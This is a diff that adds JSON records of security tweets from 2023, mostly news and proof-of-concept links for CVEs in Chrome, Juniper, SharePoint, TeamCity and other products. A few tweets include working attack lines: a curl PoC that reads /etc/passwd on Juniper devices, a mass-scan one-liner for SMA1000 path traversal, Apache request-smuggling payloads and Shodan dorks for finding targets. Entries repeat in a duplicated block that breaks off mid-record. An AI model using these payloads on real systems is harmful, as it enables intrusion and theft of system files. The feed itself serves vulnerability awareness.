@@ -408,3 +408,823 @@
     "tweeturl": "https://twitter.com/hack_git/status/1697940146253902274",
     "username": "hack_git"
 }
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/#"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "Analysis of an RCE vulnerability affecting the Microsoft Message Queueing (MSMQ) service (CVE-2023-21554).\nGreat work by Valentina Palmiotti (@chompie1337), Fabius Watson (@FabiusArtrel), and Aaron Portnoy (@aaronportnoy)\n\nhttps://t.co/b8tNhGALSF\n\n#exploit #rce #cybersecurity https://t.co/fxanxj5TE5",
+    "tweettime": "2023-09-30, 07:30:11",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1708021407970463944",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://chromium.googlesource.com/webm/libvpx/+/3fbd1dca6a4d2dad332a2110d646e4ffef36d590"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "New Google Chrome In-The-Wild vulnerability used by a commercial surveillance vendor is a buffer overflow in vp8 encoding in libvpx (CVE-2023-5217 [1486441]) and happens due to allowing thread count change after encoder creation:\nhttps://t.co/CrswteBsh3",
+    "tweettime": "2023-09-28, 13:23:13",
+    "tweeturl": "https://twitter.com/hosselot/status/1707385476364312871",
+    "username": "hosselot"
+}
+{
+    "tweetfavorites": 291,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 110,
+    "tweettext": "finally Juniper - Remote Code Execution 🔥 ( CVE-2023-36845 )  \nShodan Dork : title:\"Juniper\" http.favicon.hash:2141724739  \n\nPoc: curl &lt;TARGET&gt; -F $'auto_prepend_file=\"/etc/passwd\\n\"' -F 'PHPRC=/dev/fd/0'\n\n#bugbountytips #bugbounty #CVE-2023-36845 #RCE https://t.co/FbXzJzcxHW",
+    "tweettime": "2023-09-28, 09:56:02",
+    "tweeturl": "https://twitter.com/zapstiko/status/1707333333292838946",
+    "username": "zapstiko"
+}
+{
+    "expanded_url": [
+        "https://github.com/s3cb0y/CVE-2023-43770-POC"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 33,
+    "tweettext": "GitHub - s3cb0y/CVE-2023-43770-POC: A Proof-Of-Concept for the CVE-2023-43770 vulnerability. - https://t.co/0tSLo2vC2G",
+    "tweettime": "2023-09-28, 06:04:04",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1707274960434328021",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 128,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 32,
+    "tweettext": "CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000\n\nOne Liner\ncat file.txt| while read host do;do curl -sk \"http://$host:8443/images//////////////////../../../../../../../../etc/passwd\" | grep -i 'root:' &amp;&amp; echo $host \"is VULN\";done\n\n#bugbountytips #bug #CVE https://t.co/shFnrXWTX5",
+    "tweettime": "2023-09-28, 05:36:57",
+    "tweeturl": "https://twitter.com/thecybertix/status/1707268135907475495",
+    "username": "thecybertix"
+}
+{
+    "tweetfavorites": 225,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 109,
+    "tweettext": "⚠️ CRITICAL ALERT\n🚨 ZERO-DAY on Chrome\n\nGoogle has patched the fifth Chrome zero-day vulnerability exploited in attacks since the start of the year in emergency security updates released today.\n\nUPDATE YOUR DEVICES NOW &amp; PLEASE SHARE!\n\nCVE-2023-5217 https://t.co/ErkYnLWleG",
+    "tweettime": "2023-09-27, 22:38:56",
+    "tweeturl": "https://twitter.com/wallet_guard/status/1707162938669142435",
+    "username": "wallet_guard"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 90,
+    "tweettext": "RT @mmolgtm: In this post I'll use CVE-2023-3420, an incorrect side effect modelling bug in the JIT compiler that I reported to Chrome, to…",
+    "tweettime": "2023-09-27, 14:53:59",
+    "tweeturl": "https://twitter.com/0vercl0k/status/1707045929713639602",
+    "username": "0vercl0k"
+}
+{
+    "tweetfavorites": 139,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 25,
+    "tweettext": "CVE-2023-35813 sitecore RCE https://t.co/Ib7EEwXbxZ",
+    "tweettime": "2023-09-27, 06:37:45",
+    "tweeturl": "https://twitter.com/chybeta/status/1706921047197639071",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 57,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 6,
+    "tweettext": "new Apple updates!\n\n- CVE-2023-39434 : WebKit GPU Use-After-Free\n    - webkit commit : 249451\n- CVE-2023-40403 : libxslt Information Disclosure (Works in Safari)\n- Additional recognition\n\nIn the case of CVE-2023-39434, there are many changes in the patch. https://t.co/pzADoaTZq0",
+    "tweettime": "2023-09-26, 22:17:05",
+    "tweeturl": "https://twitter.com/l33d0hyun/status/1706795049915453649",
+    "username": "l33d0hyun"
+}
+{
+    "expanded_url": [
+        "https://github.com/Chocapikk/CVE-2023-29357"
+    ],
+    "tweetfavorites": 270,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 105,
+    "tweettext": "My friend @Chocapikk_ was able to replicate #CVE-2023-29357. It's an #authentication #bypass in @Microsoft #SharePoint API.\n\nThe #PoC can be found here:\nhttps://t.co/hZlJauYFET\n\nThis can be extended to #RCE! Please #patch now!",
+    "tweettime": "2023-09-26, 20:14:33",
+    "tweeturl": "https://twitter.com/Gi7w0rm/status/1706764212704591953",
+    "username": "Gi7w0rm"
+}
+{
+    "expanded_url": [
+        "https://github.blog/2023-09-26-getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/"
+    ],
+    "tweetfavorites": 241,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 90,
+    "tweettext": "In this post I'll use CVE-2023-3420, an incorrect side effect modelling bug in the JIT compiler that I reported to Chrome, to gain a sandboxed remote code execution in the renderer: https://t.co/mFdIXuM7xY",
+    "tweettime": "2023-09-26, 15:12:48",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1706688276801667114",
+    "username": "mmolgtm"
+}
+{
+    "tweetfavorites": 365,
+    "tweetquotes": 6,
+    "tweetreplies": 6,
+    "tweetretweets": 86,
+    "tweettext": "🔥 We have reproduced the fresh CVE-2023-42793 in JetBrains TeamCity.\n\nAuthentication bypass allows an external attacker to gain administrative access to the server and execute any commands on it.  \n\nUpdate your software ASAP! https://t.co/DXp2gJ1HTq",
+    "tweettime": "2023-09-25, 08:27:36",
+    "tweeturl": "https://twitter.com/ptswarm/status/1706223917008834748",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://chromium.googlesource.com/v8/v8.git/+/ae7dc61652805bc8e2b060d53b2b6da7cf846b6f"
+    ],
+    "tweetfavorites": 91,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 20,
+    "tweettext": "Chrome In-The-Wild type confusion vulnerability used in the Android Exploit Chain to install Predator on Android devices in Egypt (CVE-2023-4762 [1473247]) happens during handling of growing a non-JSArray packed elements kind within turbofan:\nhttps://t.co/qQ99LkwaMI",
+    "tweettime": "2023-09-24, 15:31:42",
+    "tweeturl": "https://twitter.com/hosselot/status/1705968257205670082",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 37,
+    "tweettext": "RT @nguyendt016: POC for CVE-2023-41892 (Craft CMS Remote Code Execution):\nhttps://t.co/x5PMK0hOaS\n\n#CVE #CraftCMS",
+    "tweettime": "2023-09-24, 15:09:09",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1705962582774104064",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2023/8/1/exploiting-a-flaw-in-bitmap-handling-in-windows-user-mode-printer-drivers"
+    ],
+    "tweetfavorites": 252,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 76,
+    "tweettext": "Interesting reading on Windows privilege escalation through Use-After-Free (UAF) in win32kfull (CVE-2023-21822)\nCredits Marcin Wiązowski (@thezdi)\n\nhttps://t.co/H842SjZa71\n\n#exploit #Windows #infosec https://t.co/c5H0IwuJt2",
+    "tweettime": "2023-09-24, 07:30:02",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1705847042843492538",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://securityonline.info/poc-released-for-chrome-zero-day-cve-2023-4863-vulnerability/"
+    ],
+    "tweetfavorites": 83,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "PoC released for Chrome zero-day CVE-2023-4863 vulnerability https://t.co/PaGnSvv4gq",
+    "tweettime": "2023-09-22, 17:56:13",
+    "tweeturl": "https://twitter.com/Dinosn/status/1705279848279584988",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://blog.isosceles.com/the-webp-0day/"
+    ],
+    "tweetfavorites": 854,
+    "tweetquotes": 32,
+    "tweetreplies": 16,
+    "tweetretweets": 344,
+    "tweettext": "\"The WebP 0day\" -- a full technical analysis the recently patched vulnerability in the WebP image library that was exploited in the wild (CVE-2023-4863). https://t.co/6yUcE9sOZa",
+    "tweettime": "2023-09-21, 17:20:30",
+    "tweeturl": "https://twitter.com/benhawkes/status/1704908471815356506",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 347,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 60,
+    "tweettext": "CVE-2023-41892 Craftcms RCE using PHP reflection https://t.co/SHFQ5MGX9B",
+    "tweettime": "2023-09-18, 08:19:32",
+    "tweeturl": "https://twitter.com/chybeta/status/1703685169637704121",
+    "username": "chybeta"
+}
+{
+    "expanded_url": [
+        "https://exploits.forsale/themebleed/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 18,
+    "tweettext": "CVE-2023-38146: Arbitrary Code Execution via Windows Themes. A series of issues exist on Windows 11 which can lead to arbitrary code being executed when a user loads a .theme file.\n\nPoC\nhttps://t.co/8TEHPZjO0w https://t.co/SbZz9R9gJH",
+    "tweettime": "2023-09-14, 09:04:17",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1702246880439099715",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://chromereleases.googleblog.com/2023/09/stable-channel-update-for-desktop_11.html"
+    ],
+    "tweetfavorites": 120,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 51,
+    "tweettext": "New Chrome 0day \nCVE-2023-4863\nI saw the person who submitted the vulnerability and wondered if it was related to Pegasus.\nhttps://t.co/fIcSSRholN https://t.co/HpRyizECyF",
+    "tweettime": "2023-09-13, 02:31:35",
+    "tweeturl": "https://twitter.com/blackorbird/status/1701785666005430395",
+    "username": "blackorbird"
+}
+{
+    "expanded_url": [
+        "https://github.com/metaredteam/external-disclosures/security/advisories/GHSA-x7ch-h5rf-w2mf"
+    ],
+    "tweetfavorites": 696,
+    "tweetquotes": 10,
+    "tweetreplies": 12,
+    "tweetretweets": 176,
+    "tweettext": "Time for an Arm-twist! CVE-2023-4039\n\nTom Hebb (Meta red team) and I discovered an 0day in GCC (for AArch64 targets) during my Arm exploitation training. \n\nIt renders stack canaries against overflows of dynamically-sized variables useless. \n\nhttps://t.co/q0vX86e9gK https://t.co/0NDB39Xg8f",
+    "tweettime": "2023-09-12, 15:52:12",
+    "tweeturl": "https://twitter.com/Fox0x01/status/1701624762059895228",
+    "username": "Fox0x01"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 98,
+    "tweettext": "RT @0xor0ne: CVE-2022-34718: Patch analysis, bug identification and exploit development (Windows TCP/IP Remote Code Execution Vulnerability…",
+    "tweettime": "2023-09-12, 07:50:40",
+    "tweeturl": "https://twitter.com/_odisseus/status/1701503581906497645",
+    "username": "_odisseus"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2023/09/google-rushes-to-patch-critical-chrome.html"
+    ],
+    "tweetfavorites": 475,
+    "tweetquotes": 14,
+    "tweetreplies": 10,
+    "tweetretweets": 299,
+    "tweettext": "Urgent: Google releases patch for a new Chrome zero-day #vulnerability (CVE-2023-4863) that's being exploited in the wild.\n\nRead: https://t.co/41SANY0lKi\n\nDon't wait—update your browser now to protect against potential cyber threats.\n\n#cybersecurity #informationsecurity",
+    "tweettime": "2023-09-12, 05:17:51",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1701465123095785662",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://chromium.googlesource.com/webm/libwebp.git/+/2af26267cdfcb63a88e5c74a85927a12d6ca1d76"
+    ],
+    "tweetfavorites": 105,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "The new In-The-Wild Google Chrome Heap buffer overflow in WebP (CVE-2023-4863) is due to an out-of-bounds write vulnerability within the \"BuildHuffmanTable\" function:\nhttps://t.co/74LEkbLeCO",
+    "tweettime": "2023-09-11, 21:48:02",
+    "tweeturl": "https://twitter.com/hosselot/status/1701351922953748881",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/dissecting-exploiting-tcp-ip-rce-vulnerability-evilesp/"
+    ],
+    "tweetfavorites": 276,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 98,
+    "tweettext": "CVE-2022-34718: Patch analysis, bug identification and exploit development (Windows TCP/IP Remote Code Execution Vulnerability)\nExcellent blog post by @chompie1337 \n\nhttps://t.co/ZDEOVqM765 \n\n#cybersecurity #cve #exploit https://t.co/7WfuQUqbeG",
+    "tweettime": "2023-09-11, 16:30:13",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1701271939149389927",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://bugs.chromium.org/p/chromium/issues/detail?id=1450481"
+    ],
+    "tweetfavorites": 58,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 13,
+    "tweettext": "The Chromium bug entry is now open with a PoC (CVE-2023-3079):\nhttps://t.co/FlqP95rvWN",
+    "tweettime": "2023-09-08, 19:23:38",
+    "tweeturl": "https://twitter.com/hosselot/status/1700228420620190042",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://github.com/bjrjk/CVE-2022-4262/blob/main/CVE-2022-4262.md"
+    ],
+    "tweetfavorites": 124,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 33,
+    "tweettext": "More good stuff on Chrome RCE vuln research: @bjrjk wrote a super deep dive analysis of CVE-2022-4262, a non-trivial type confusion in v8 JavaScript engine which I reverse-engineered from patch early this year and briefly covered in my PHDays talk in May:  https://t.co/lhWuQPXngG…",
+    "tweettime": "2023-09-07, 08:33:17",
+    "tweeturl": "https://twitter.com/alisaesage/status/1699702365337870413",
+    "username": "alisaesage"
+}
+{
+    "expanded_url": [
+        "https://github.com/dhmosfunk/CVE-2023-25690-POC"
+    ],
+    "tweetfavorites": 323,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 121,
+    "tweettext": "[PoC] [CVE-2023-25690] Apache HTTP Server mod_proxy vul\n\nCLRF Injection\nGET /categories/1%20HTTP/1.1%0d%0aFoo:%20baarr HTTP/1.1\nHost: \n\nHeader Injection\nGET /categories/1%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/SMUGGLED HTTP/1.1\nHost: 1.1.1.1\n\nhttps://t.co/st5iVALH8V",
+    "tweettime": "2023-09-06, 01:27:31",
+    "tweeturl": "https://twitter.com/wugeej/status/1699232831883628673",
+    "username": "wugeej"
+}
+{
+    "tweetfavorites": 38,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 1,
+    "tweettext": "The past week I completely failed to port a Chrome sandbox escape exploit for CVE-2021-30633 to Chrome 90. And by completely, I mean _completely_. This is not something I've attempted before, and I have learned so much in the process.... but man, do I feel like a failure 😆",
+    "tweettime": "2023-09-04, 13:19:24",
+    "tweeturl": "https://twitter.com/ajxchapman/status/1698687203419828522",
+    "username": "ajxchapman"
+}
+{
+    "tweetfavorites": 133,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2023-4596: RCE in Forminator plugin for WordPress, 9.8 rating 🔥\n\nThe Forminator plugin in WP is vulnerable to arbitrary file upload for unauthenticated users, which may make RCE possible. PoC is available❗️\n\n👉🏻 Dork: http.body:\"/wp-content/plugins/forminator\"\n\nPoC is here:… https://t.co/ET2b36wngI",
+    "tweettime": "2023-09-04, 11:34:53",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1698660901845700942",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://blog.coffinsec.com/0day/2023/05/31/minidlna-heap-overflow-rca.html",
+        "https://blog.coffinsec.com/0day/2023/06/19/minidlna-cve-2023-33476-exploits.html"
+    ],
+    "tweetfavorites": 69,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 20,
+    "tweettext": "minidlna 1.3.2 cve-2023-33476 root cause analysis and exploitation \n\nPart1:\nhttp chunk parsing heap overflow (cve-2023-33476) root cause analysis\nhttps://t.co/4hhlWUd7ou\n\nPart2:\nexploiting cve-2023-33476 for remote code execution\nhttps://t.co/1F4HpkgWYW",
+    "tweettime": "2023-09-03, 07:45:25",
+    "tweeturl": "https://twitter.com/kmkz_security/status/1698240766168973659",
+    "username": "kmkz_security"
+}
+{
+    "expanded_url": [
+        "https://github.com/sinsinology/CVE-2023-34039"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 26,
+    "tweettext": "POC for CVE-2023-34039 VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE\nhttps://t.co/rEymx6tdxy",
+    "tweettime": "2023-09-03, 03:07:10",
+    "tweeturl": "https://twitter.com/momika233/status/1698170745644630308",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://cert.gov.ua/article/5661411"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 89,
+    "tweettext": "RT @blackorbird: #GhostWriter Used CVE-2023-38831 to construct malware.\nhttps://t.co/oolDetFliU https://t.co/tVIgCENaV3",
+    "tweettime": "2023-09-02, 15:03:28",
+    "tweeturl": "https://twitter.com/cyber_advising/status/1697988619347063272",
+    "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/sinsinology/CVE-2023-34039"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 38,
+    "tweettext": "CVE-2023-34039\n\nPOC for CVE-2023-34039 VMWare Aria Operations for Networks (vRealize Network Insight) Static SSH key RCE\n\nhttps://t.co/ZIBwnUGnFy\n\n#cve #cybersecurity #infosec #pentesting #redteam https://t.co/sG6l7gYHsX",
+    "tweettime": "2023-09-02, 11:50:51",
+    "tweeturl": "https://twitter.com/hack_git/status/1697940146253902274",
+    "username": "hack_git"
+}
+{
+    "expanded_url": [
+        "https://securityintelligence.com/posts/msmq-queuejumper-rce-vulnerability-technical-analysis/#"
+    ],
+    "tweetfavorites": 181,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 51,
+    "tweettext": "Analysis of an RCE vulnerability affecting the Microsoft Message Queueing (MSMQ) service (CVE-2023-21554).\nGreat work by Valentina Palmiotti (@chompie1337), Fabius Watson (@FabiusArtrel), and Aaron Portnoy (@aaronportnoy)\n\nhttps://t.co/b8tNhGALSF\n\n#exploit #rce #cybersecurity https://t.co/fxanxj5TE5",
+    "tweettime": "2023-09-30, 07:30:11",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1708021407970463944",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://chromium.googlesource.com/webm/libvpx/+/3fbd1dca6a4d2dad332a2110d646e4ffef36d590"
+    ],
+    "tweetfavorites": 60,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 11,
+    "tweettext": "New Google Chrome In-The-Wild vulnerability used by a commercial surveillance vendor is a buffer overflow in vp8 encoding in libvpx (CVE-2023-5217 [1486441]) and happens due to allowing thread count change after encoder creation:\nhttps://t.co/CrswteBsh3",
+    "tweettime": "2023-09-28, 13:23:13",
+    "tweeturl": "https://twitter.com/hosselot/status/1707385476364312871",
+    "username": "hosselot"
+}
+{
+    "tweetfavorites": 291,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 110,
+    "tweettext": "finally Juniper - Remote Code Execution 🔥 ( CVE-2023-36845 )  \nShodan Dork : title:\"Juniper\" http.favicon.hash:2141724739  \n\nPoc: curl &lt;TARGET&gt; -F $'auto_prepend_file=\"/etc/passwd\\n\"' -F 'PHPRC=/dev/fd/0'\n\n#bugbountytips #bugbounty #CVE-2023-36845 #RCE https://t.co/FbXzJzcxHW",
+    "tweettime": "2023-09-28, 09:56:02",
+    "tweeturl": "https://twitter.com/zapstiko/status/1707333333292838946",
+    "username": "zapstiko"
+}
+{
+    "expanded_url": [
+        "https://github.com/s3cb0y/CVE-2023-43770-POC"
+    ],
+    "tweetfavorites": 95,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 33,
+    "tweettext": "GitHub - s3cb0y/CVE-2023-43770-POC: A Proof-Of-Concept for the CVE-2023-43770 vulnerability. - https://t.co/0tSLo2vC2G",
+    "tweettime": "2023-09-28, 06:04:04",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1707274960434328021",
+    "username": "piedpiper1616"
+}
+{
+    "tweetfavorites": 128,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 32,
+    "tweettext": "CVE-2023-0126 Pre-authentication path traversal vulnerability in SMA1000\n\nOne Liner\ncat file.txt| while read host do;do curl -sk \"http://$host:8443/images//////////////////../../../../../../../../etc/passwd\" | grep -i 'root:' &amp;&amp; echo $host \"is VULN\";done\n\n#bugbountytips #bug #CVE https://t.co/shFnrXWTX5",
+    "tweettime": "2023-09-28, 05:36:57",
+    "tweeturl": "https://twitter.com/thecybertix/status/1707268135907475495",
+    "username": "thecybertix"
+}
+{
+    "tweetfavorites": 225,
+    "tweetquotes": 10,
+    "tweetreplies": 9,
+    "tweetretweets": 109,
+    "tweettext": "⚠️ CRITICAL ALERT\n🚨 ZERO-DAY on Chrome\n\nGoogle has patched the fifth Chrome zero-day vulnerability exploited in attacks since the start of the year in emergency security updates released today.\n\nUPDATE YOUR DEVICES NOW &amp; PLEASE SHARE!\n\nCVE-2023-5217 https://t.co/ErkYnLWleG",
+    "tweettime": "2023-09-27, 22:38:56",
+    "tweeturl": "https://twitter.com/wallet_guard/status/1707162938669142435",
+    "username": "wallet_guard"
+}
+{
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 90,
+    "tweettext": "RT @mmolgtm: In this post I'll use CVE-2023-3420, an incorrect side effect modelling bug in the JIT compiler that I reported to Chrome, to…",
+    "tweettime": "2023-09-27, 14:53:59",
+    "tweeturl": "https://twitter.com/0vercl0k/status/1707045929713639602",
+    "username": "0vercl0k"
+}
+{
+    "tweetfavorites": 139,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 25,
+    "tweettext": "CVE-2023-35813 sitecore RCE https://t.co/Ib7EEwXbxZ",
+    "tweettime": "2023-09-27, 06:37:45",
+    "tweeturl": "https://twitter.com/chybeta/status/1706921047197639071",
+    "username": "chybeta"
+}
+{
+    "tweetfavorites": 57,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 6,
+    "tweettext": "new Apple updates!\n\n- CVE-2023-39434 : WebKit GPU Use-After-Free\n    - webkit commit : 249451\n- CVE-2023-40403 : libxslt Information Disclosure (Works in Safari)\n- Additional recognition\n\nIn the case of CVE-2023-39434, there are many changes in the patch. https://t.co/pzADoaTZq0",
+    "tweettime": "2023-09-26, 22:17:05",
+    "tweeturl": "https://twitter.com/l33d0hyun/status/1706795049915453649",
+    "username": "l33d0hyun"
+}
+{
+    "expanded_url": [
+        "https://github.com/Chocapikk/CVE-2023-29357"
+    ],
+    "tweetfavorites": 270,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 105,
+    "tweettext": "My friend @Chocapikk_ was able to replicate #CVE-2023-29357. It's an #authentication #bypass in @Microsoft #SharePoint API.\n\nThe #PoC can be found here:\nhttps://t.co/hZlJauYFET\n\nThis can be extended to #RCE! Please #patch now!",
+    "tweettime": "2023-09-26, 20:14:33",
+    "tweeturl": "https://twitter.com/Gi7w0rm/status/1706764212704591953",
+    "username": "Gi7w0rm"
+}
+{
+    "expanded_url": [
+        "https://github.blog/2023-09-26-getting-rce-in-chrome-with-incorrect-side-effect-in-the-jit-compiler/"
+    ],
+    "tweetfavorites": 241,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 90,
+    "tweettext": "In this post I'll use CVE-2023-3420, an incorrect side effect modelling bug in the JIT compiler that I reported to Chrome, to gain a sandboxed remote code execution in the renderer: https://t.co/mFdIXuM7xY",
+    "tweettime": "2023-09-26, 15:12:48",
+    "tweeturl": "https://twitter.com/mmolgtm/status/1706688276801667114",
+    "username": "mmolgtm"
+}
+{
+    "tweetfavorites": 365,
+    "tweetquotes": 6,
+    "tweetreplies": 6,
+    "tweetretweets": 86,
+    "tweettext": "🔥 We have reproduced the fresh CVE-2023-42793 in JetBrains TeamCity.\n\nAuthentication bypass allows an external attacker to gain administrative access to the server and execute any commands on it.  \n\nUpdate your software ASAP! https://t.co/DXp2gJ1HTq",
+    "tweettime": "2023-09-25, 08:27:36",
+    "tweeturl": "https://twitter.com/ptswarm/status/1706223917008834748",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://chromium.googlesource.com/v8/v8.git/+/ae7dc61652805bc8e2b060d53b2b6da7cf846b6f"
+    ],
+    "tweetfavorites": 91,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 20,
+    "tweettext": "Chrome In-The-Wild type confusion vulnerability used in the Android Exploit Chain to install Predator on Android devices in Egypt (CVE-2023-4762 [1473247]) happens during handling of growing a non-JSArray packed elements kind within turbofan:\nhttps://t.co/qQ99LkwaMI",
+    "tweettime": "2023-09-24, 15:31:42",
+    "tweeturl": "https://twitter.com/hosselot/status/1705968257205670082",
+    "username": "hosselot"
+}
+{
+    "expanded_url": [
+        "https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226"
+    ],
+    "tweetfavorites": 0,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 37,
+    "tweettext": "RT @nguyendt016: POC for CVE-2023-41892 (Craft CMS Remote Code Execution):\nhttps://t.co/x5PMK0hOaS\n\n#CVE #CraftCMS",
+    "tweettime": "2023-09-24, 15:09:09",
+    "tweeturl": "https://twitter.com/piedpiper1616/status/1705962582774104064",
+    "username": "piedpiper1616"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2023/8/1/exploiting-a-flaw-in-bitmap-handling-in-windows-user-mode-printer-drivers"
+    ],
+    "tweetfavorites": 252,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 76,
+    "tweettext": "Interesting reading on Windows privilege escalation through Use-After-Free (UAF) in win32kfull (CVE-2023-21822)\nCredits Marcin Wiązowski (@thezdi)\n\nhttps://t.co/H842SjZa71\n\n#exploit #Windows #infosec https://t.co/c5H0IwuJt2",
+    "tweettime": "2023-09-24, 07:30:02",
+    "tweeturl": "https://twitter.com/0xor0ne/status/1705847042843492538",
+    "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://securityonline.info/poc-released-for-chrome-zero-day-cve-2023-4863-vulnerability/"
+    ],
+    "tweetfavorites": 83,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 22,
+    "tweettext": "PoC released for Chrome zero-day CVE-2023-4863 vulnerability https://t.co/PaGnSvv4gq",
+    "tweettime": "2023-09-22, 17:56:13",
+    "tweeturl": "https://twitter.com/Dinosn/status/1705279848279584988",
+    "username": "Dinosn"
+}
+{
+    "expanded_url": [
+        "https://blog.isosceles.com/the-webp-0day/"
+    ],
+    "tweetfavorites": 854,
+    "tweetquotes": 32,
+    "tweetreplies": 16,
+    "tweetretweets": 344,
+    "tweettext": "\"The WebP 0day\" -- a full technical analysis the recently patched vulnerability in the WebP image library that was exploited in the wild (CVE-2023-4863). https://t.co/6yUcE9sOZa",
+    "tweettime": "2023-09-21, 17:20:30",
+    "tweeturl": "https://twitter.com/benhawkes/status/1704908471815356506",
+    "username": "benhawkes"
+}
+{
+    "tweetfavorites": 347,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 60,
+    "tweettext": "CVE-2023-41892 Craftcms RCE using PHP reflection https://t.co/SHFQ5MGX9B",
+    "tweettime": "2023-09-18, 08:19:32",
